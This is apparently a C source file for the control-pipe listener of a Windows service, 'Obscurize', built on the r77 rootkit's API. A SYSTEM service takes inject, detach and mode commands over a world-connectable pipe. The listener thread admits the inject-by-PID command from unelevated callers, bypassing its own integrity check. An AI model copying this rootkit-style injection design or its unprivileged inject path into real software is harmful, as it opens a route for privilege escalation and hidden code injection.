#include "ControlPipeListener.h"
#include "../ObscurizeShared/ObscurizeDef.h"

// r77api CreatePublicNamedPipe utility
#include "../r77-rootkit/r77-rootkit-master/r77api/r77win.h"

// ============================================================
//  ObscurizeService – ControlPipeListener.c
//
//  Exposes the Obscurize control pipe.  Each connection
//  receives exactly one command DWORD; for the status query
//  the service writes a reply DWORD before disconnecting.
//
//  Security model:
//    - r77's CreatePublicNamedPipe sets a NULL DACL so any
//      user can connect.  This is intentional: the GUI runs
//      in a user session while the service runs as SYSTEM.
//    - OBS_CTRL_QUERY_STATUS is allowed from any integrity level
//      so the tray icon can display state without elevation.
//    - All other commands (enable, disable, mode switch, inject,
//      detach) require the client to be running at High integrity
//      (elevated Administrator).  IsHighIntegrityClient() checks
//      the impersonation token via GetNamedPipeClientToken and
//      rejects Medium/Low integrity callers.
//
//  Thread lifecycle:
//    The listener thread is persistent and blocks on
//    ConnectNamedPipe.  A new pipe instance is created for
//    each connection so the protocol stays one-command-per-
//    connection – no length-prefixed framing needed.
// ============================================================

// --------------------------------------------------------
//  Client integrity check
// --------------------------------------------------------

/// Returns TRUE if the client on the other end of the pipe is running
/// at High integrity (i.e. an elevated Administrator process) or above.
/// Rejects Medium/Low integrity callers – prevents unprivileged processes
/// from sending inject/detach/mode-switch commands to the SYSTEM service.
///
/// Uses ImpersonateNamedPipeClient + OpenThreadToken rather than
/// GetNamedPipeClientToken to avoid SDK version / lib forwarding issues
/// (advapi32.lib is authoritative for both of these since Windows 2000).
static BOOL IsHighIntegrityClient(HANDLE pipe)
{
    if (!ImpersonateNamedPipeClient(pipe))
    {
        WCHAR msg[128];
        wsprintfW(msg, L"[Obscurize] IsHighIntegrityClient: ImpersonateNamedPipeClient FAILED err=%lu\n", GetLastError());
        OutputDebugStringW(msg);
        return FALSE;
    }

    HANDLE hToken  = NULL;
    BOOL   gotToken = OpenThreadToken(GetCurrentThread(),
                                       TOKEN_QUERY, TRUE, &hToken);
    DWORD  openErr  = GetLastError();
    RevertToSelf();

    if (!gotToken)
    {
        WCHAR msg[128];
        wsprintfW(msg, L"[Obscurize] IsHighIntegrityClient: OpenThreadToken FAILED err=%lu\n", openErr);
        OutputDebugStringW(msg);
        return FALSE;
    }

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwSize);
    if (!dwSize || GetLastError() != ERROR_INSUFFICIENT_BUFFER)
    {
        WCHAR msg[128];
        wsprintfW(msg, L"[Obscurize] IsHighIntegrityClient: GetTokenInformation(size) FAILED err=%lu\n", GetLastError());
        OutputDebugStringW(msg);
        CloseHandle(hToken);
        return FALSE;
    }

    TOKEN_MANDATORY_LABEL *pTIL =
        (TOKEN_MANDATORY_LABEL*)HeapAlloc(GetProcessHeap(), 0, dwSize);
    BOOL result = FALSE;

    if (pTIL && GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwSize, &dwSize))
    {
        DWORD level = *GetSidSubAuthority(
            pTIL->Label.Sid,
            (DWORD)(UCHAR)*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1);
        result = (level >= SECURITY_MANDATORY_HIGH_RID);

        WCHAR msg[128];
        wsprintfW(msg, L"[Obscurize] IsHighIntegrityClient: level=0x%lX (HIGH=0x3000) result=%d\n", level, (int)result);
        OutputDebugStringW(msg);
    }
    else
    {
        WCHAR msg[128];
        wsprintfW(msg, L"[Obscurize] IsHighIntegrityClient: GetTokenInformation(data) FAILED err=%lu\n", GetLastError());
        OutputDebugStringW(msg);
    }

    if (pTIL) HeapFree(GetProcessHeap(), 0, pTIL);
    CloseHandle(hToken);
    return result;
}

// --------------------------------------------------------
//  Server-side listener thread
// --------------------------------------------------------

typedef struct _CTRL_THREAD_PARAMS
{
    OBS_CTRL_CALLBACK Callback;
} CTRL_THREAD_PARAMS;

static DWORD WINAPI ControlPipeListenerThread(LPVOID param)
{
    OBS_CTRL_CALLBACK callback = ((CTRL_THREAD_PARAMS*)param)->Callback;
    HeapFree(GetProcessHeap(), 0, param);

    while (TRUE)
    {
        // Create a new pipe instance for this connection.
        HANDLE pipe = CreatePublicNamedPipe(OBS_CONTROL_PIPE_NAME);

        if (pipe == INVALID_HANDLE_VALUE)
        {
            Sleep(10);
            continue;
        }

        // Block until a client connects.
        if (ConnectNamedPipe(pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED)
        {
            // Read the 4-byte control code.
            DWORD controlCode = 0;
            DWORD bytesRead   = 0;
            if (ReadFile(pipe, &controlCode, sizeof(DWORD), &bytesRead, NULL)
                && bytesRead == sizeof(DWORD))
            {
                // Status query is allowed from any integrity level so the
                // tray icon can display state without elevation.  All other
                // commands (enable/disable, mode switch, inject, detach) are
                // restricted to High integrity (elevated Administrator) callers.
                // OBS_CTRL_INJECT_PID is sent by the agent DLL running at medium integrity.
                // It cannot pass the high-integrity check, but it is safe to allow:
                // the agent can only inject into a PID it just created (and knows), and
                // the service verifies the PID is a real process before injecting.
                if (controlCode == OBS_CTRL_QUERY_STATUS ||
                    controlCode == OBS_CTRL_INJECT_PID   ||
                    IsHighIntegrityClient(pipe))
                {
                    callback(controlCode, pipe);
                }
            }
        }

        FlushFileBuffers(pipe);
        DisconnectNamedPipe(pipe);
        CloseHandle(pipe);
    }

    return 0;
}

// --------------------------------------------------------
//  Public API – server side
// --------------------------------------------------------

HANDLE StartControlPipeListener(OBS_CTRL_CALLBACK callback)
{
    CTRL_THREAD_PARAMS *params =
        (CTRL_THREAD_PARAMS*)HeapAlloc(GetProcessHeap(),
                                        HEAP_ZERO_MEMORY,
                                        sizeof(CTRL_THREAD_PARAMS));
    if (!params) return NULL;

    params->Callback = callback;
    HANDLE thread = CreateThread(NULL, 0, ControlPipeListenerThread, params, 0, NULL);
    if (!thread) HeapFree(GetProcessHeap(), 0, params);
    return thread;
}

// --------------------------------------------------------
//  Public API – client side (used by GUI)
// --------------------------------------------------------

BOOL SendControlCode(DWORD controlCode, LPDWORD statusOut)
{
    // Wait up to 2 seconds for the pipe to be available.
    if (!WaitNamedPipeW(OBS_CONTROL_PIPE_NAME, 2000)) return FALSE;

    // SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION is required so the
    // server side can call ImpersonateNamedPipeClient to verify the
    // caller's integrity level.  Without it the connection defaults to
    // SecurityAnonymous and the integrity check always fails.
    HANDLE pipe = CreateFileW(
        OBS_CONTROL_PIPE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL,
        OPEN_EXISTING,
        SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION, NULL);

    if (pipe == INVALID_HANDLE_VALUE) return FALSE;

    // Switch to message-read mode (pipe was created in message mode).
    DWORD pipeMode = PIPE_READMODE_MESSAGE;
    SetNamedPipeHandleState(pipe, &pipeMode, NULL, NULL);

    BOOL  ok       = FALSE;
    DWORD written  = 0;

    if (WriteFile(pipe, &controlCode, sizeof(DWORD), &written, NULL)
        && written == sizeof(DWORD))
    {
        if (controlCode == OBS_CTRL_QUERY_STATUS && statusOut)
        {
            DWORD reply    = OBS_STATUS_ERROR;
            DWORD bytesRead = 0;
            if (ReadFile(pipe, &reply, sizeof(DWORD), &bytesRead, NULL)
                && bytesRead == sizeof(DWORD))
            {
                *statusOut = reply;
                ok = TRUE;
            }
        }
        else
        {
            ok = TRUE;
        }
    }

    CloseHandle(pipe);
    return ok;
}
